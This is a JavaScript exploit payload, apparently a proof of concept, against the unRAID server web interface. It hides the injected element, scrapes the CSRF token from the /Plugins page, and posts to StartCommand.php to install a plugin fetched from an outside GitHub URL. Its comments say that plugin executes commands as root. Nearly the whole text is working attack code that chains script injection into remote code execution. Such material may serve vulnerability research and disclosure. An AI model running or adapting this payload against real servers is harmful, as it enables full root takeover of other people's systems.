// This selects the div with the exact 'data-appname' value "<script>fetch("
var div = document.querySelector('[data-appname="<script>fetch("]');

// Make it invisible by setting style properties
div.style.display = 'none';  // This will hide the div entirely

// Execute arbitrary JS
// In this case, retrieve a valid CSRF token and use it to install a plugin
// The plugin executes commands as the root user on the unRAID server
// Step 1: Make a GET request to the `/Plugins` page on the current host
fetch('/Plugins')
  .then(response => response.text())  // Step 2: Get the HTML content as text
  .then(html => {
    // Step 3: Extract the CSRF token using a regular expression
    const csrfTokenMatch = html.match(/\s*var csrf_token\s*=\s*"([^"]+)";/);

    if (csrfTokenMatch && csrfTokenMatch[1]) {
      var csrfToken = csrfTokenMatch[1];  // Store the CSRF token
      
      // Step 4: Make the POST request with the retrieved CSRF token
      return fetch('/webGui/include/StartCommand.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: `cmd=plugin+install+https%3A%2F%2Fraw%2Egithubusercontent%2Ecom%2Fjustin%2Dhimself%2Ftest%2Frefs%2Fheads%2Fmain%2FunRAIDCore%2Eplg+nchan&start=0&csrf_token=${csrfToken}`,
        credentials: 'same-origin'  // Ensures cookies for the page are sent
      });
    } else {
      throw new Error('CSRF token not found.');
    }
  })
  .then(postResponse => postResponse.text())  // Handle the response from the POST request
  .then(postData => {
    console.log('POST request successful:', postData);  // Process the response data
  })
  .catch(error => {
    console.error('Error:', error);  // Handle errors from either request
  });
